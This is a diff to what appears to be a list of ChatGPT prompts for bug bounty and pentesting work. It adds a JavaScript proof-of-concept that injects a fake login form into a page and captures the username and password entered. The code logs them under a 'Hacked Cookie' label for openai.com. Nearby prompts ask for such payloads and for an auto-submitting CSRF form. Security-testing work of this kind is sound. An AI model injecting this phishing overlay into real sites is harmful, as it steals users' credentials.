@@ -69,6 +69,90 @@ A list of ChatGPT Prompts for Web Application Security, Bug Bounty, and Pentesti
 > 4. For every item logged to the console, prepend the label “hacked cookie:” or an equivalent description specific to the type of information displayed.
 > 5. Enhance the console output with formatting and colors to make it visually appealing and easy to read.
 
+```
+// Function to create login page
+function createLoginPage() {
+  const loginContainer = document.createElement('div');
+  loginContainer.id = 'loginContainer';
+  loginContainer.style.display = 'none';
+  loginContainer.style.position = 'fixed';
+  loginContainer.style.top = '50%';
+  loginContainer.style.left = '50%';
+  loginContainer.style.transform = 'translate(-50%, -50%)';
+  loginContainer.style.backgroundColor = '#f0f0f0';
+  loginContainer.style.padding = '20px';
+  loginContainer.style.borderRadius = '10px';
+  loginContainer.style.boxShadow = '0 0 10px rgba(0, 0, 0, 0.1)';
+
+  const loginForm = document.createElement('form');
+  loginForm.id = 'loginForm';
+  loginForm.style.backgroundColor = '#f0f0f0';
+  loginForm.style.padding = '20px';
+  loginForm.style.borderRadius = '10px';
+  loginForm.style.boxShadow = '0 0 10px rgba(0, 0, 0, 0.1)';
+
+  const heading = document.createElement('h2');
+  heading.textContent = 'Login';
+  heading.style.marginBottom = '20px';
+  heading.style.textAlign = 'center';
+
+  const usernameInput = document.createElement('input');
+  usernameInput.type = 'text';
+  usernameInput.id = 'username';
+  usernameInput.placeholder = 'Username';
+  usernameInput.style.width = '100%';
+  usernameInput.style.padding = '10px';
+  usernameInput.style.marginBottom = '10px';
+  usernameInput.style.borderRadius = '5px';
+
+  const passwordInput = document.createElement('input');
+  passwordInput.type = 'password';
+  passwordInput.id = 'password';
+  passwordInput.placeholder = 'Password';
+  passwordInput.style.width = '100%';
+  passwordInput.style.padding = '10px';
+  passwordInput.style.marginBottom = '20px';
+  passwordInput.style.borderRadius = '5px';
+
+  const loginButton = document.createElement('button');
+  loginButton.type = 'submit';
+  loginButton.textContent = 'Login';
+  loginButton.style.width = '100%';
+  loginButton.style.padding = '10px';
+  loginButton.style.border = 'none';
+  loginButton.style.backgroundColor = '#007bff';
+  loginButton.style.color = '#fff';
+  loginButton.style.borderRadius = '5px';
+  loginButton.style.cursor = 'pointer';
+
+  // Append elements to form
+  loginForm.appendChild(heading);
+  loginForm.appendChild(usernameInput);
+  loginForm.appendChild(passwordInput);
+  loginForm.appendChild(loginButton);
+
+  // Append form to container
+  loginContainer.appendChild(loginForm);
+
+  // Append container to body
+  document.body.appendChild(loginContainer);
+
+  // Show the login container
+  loginContainer.style.display = 'block';
+
+  // Log submitted form data
+  loginForm.addEventListener('submit', function(event) {
+    event.preventDefault();
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    console.log('%cHacked Cookie: Form Data for openai.com', 'color: #ff0000; font-weight: bold;');
+    console.log(`Username: ${username}, Password: ${password}`);
+  });
+}
+
+// Call function to create login page
+createLoginPage();
+```
 ### CSRF PoC
 
 > Write HTML code for the form that would make this HTTP request and make it auto-submit: &lt;insert HTTP request&gt;
